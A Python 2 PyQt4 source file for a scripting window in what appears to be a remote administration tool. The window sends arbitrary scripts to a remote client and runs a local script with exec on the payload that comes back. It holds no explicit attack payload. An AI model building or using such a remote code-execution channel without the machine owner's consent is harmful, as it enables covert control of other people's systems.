from PyQt4.QtGui import *
from PyQt4.QtCore import *

import main_ui
import idle

from libs.language import Translate

# Multi Lang
translate = Translate()
_ = lambda _word: translate.word(_word)


class mainPopup(QWidget, main_ui.Ui_Form):

    def __init__(self, args):
        QWidget.__init__(self)
        self.setupUi(self)

        self.moderator = args['moderator']
        self.client = args['client']
        self.session_id = args['session_id']
        self.module_id = args['module_id']
        self.plugins = args['plugins']

        self.setWindowTitle(_('MSCRIPTING_TITLE'))

        # init idle with lines
        self.idle = idle.LineTextWidget()
        self.lidle = idle.LineTextWidget()
        self.splitter = QSplitter()
        self.idleLayout.addWidget(self.splitter)
        self.splitter.addWidget(self.idle)
        self.splitter.addWidget(self.lidle)

        # add local html reader
        self.output = QTextEdit()
        self.splitter.addWidget(self.output)
        self.output.setHidden(True)

        self.runButton.clicked.connect(self.run_script)
        self.fromFileButton.clicked.connect(self.from_file)
        self.clearButton.clicked.connect(self.clear_script)
        self.addPluginButton.clicked.connect(self.insert_plugin)
        self.pluginSearchLine.returnPressed.connect(self.insert_plugin)

        # Shortcuts
        self.connect(QShortcut(QKeySequence('Ctrl+Return'), self), SIGNAL('activated()'), self.run_script)
        self.connect(QShortcut(QKeySequence('Ctrl+P'), self.idle), SIGNAL('activated()'), self.insert_mprint)
        self.connect(QShortcut(QKeySequence('Ctrl+F'), self), SIGNAL('activated()'), self.set_search_focus)
        self.connect(QShortcut(QKeySequence('Ctrl+1'), self), SIGNAL('activated()'), self.set_remote_focus)
        self.connect(QShortcut(QKeySequence('Ctrl+2'), self), SIGNAL('activated()'), self.set_local_focus)
        self.connect(QShortcut(QKeySequence('Ctrl+N'), self), SIGNAL('activated()'), self.setRemoteMode)
        self.connect(QShortcut(QKeySequence('Ctrl+B'), self), SIGNAL('activated()'), self.setLocalMode)

        # Autocompleter
        completer = QCompleter(self.plugins.keys())
        completer.setCompletionMode(QCompleter.PopupCompletion)
        completer.setCaseSensitivity(Qt.CaseInsensitive)
        completer.popup().setStyleSheet("background-color: #455F7A;\ncolor: #c9f5f7;")
        self.pluginSearchLine.setCompleter(completer)

    def signal(self, data):
        self.callback(data)

    def run_script(self):
        script = self.idle.getTextEdit()
        self.moderator.send_msg(str(script), 'scriptingMode', session_id=self.session_id, _to=self.client, module_id=self.module_id)
        self.callback = self.recv_script

    def setRemoteMode(self):
        self.idle.setHidden(False)
        self.lidle.setHidden(False)
        self.output.setHidden(True)

    def setLocalMode(self):
        self.idle.setHidden(True)
        self.lidle.setHidden(True)
        self.output.setHidden(False)

    def recv_script(self, data):
        mprint = data['payload']
        local_script = str(self.lidle.getTextEdit())
        self.setLocalMode()
        if len(local_script) > 0:
            try:
                exec local_script
            except Exception as e:
                self.setRemoteMode()
                self.lidle.setText(str(e))
        else:
            self.output.setHtml(mprint)

    def insert_plugin(self):
        self.setRemoteMode()
        plugin_name = str(self.pluginSearchLine.text())
        if self.plugins.has_key(plugin_name):
            self.idle.setText(self.plugins[plugin_name]['r_source'])
            if self.plugins[plugin_name].has_key('l_source'):
                self.lidle.setText(self.plugins[plugin_name]['l_source'])
        else:
            warn = QMessageBox(QMessageBox.Warning, _('SCRIPTING_NO_PLUGIN'), _('SCRIPTING_NO_PLUGIN_TEXT'))
            warn.exec_()

    def from_file(self):
        filename = QFileDialog.getOpenFileName(self, 'Open Python File', '', 'Python Files (*.py)')
        if filename:
            with open(filename, 'r') as f_:
                self.idle.setText(f_.read())

    def clear_script(self):
        self.idle.clearText()

    def insert_mprint(self):
        self.idle.appendText('mprint = ')

    def set_search_focus(self):
        self.pluginSearchLine.setFocus()

    def set_remote_focus(self):
        self.idle.setFocus()

    def set_local_focus(self):
        self.lidle.setFocus()
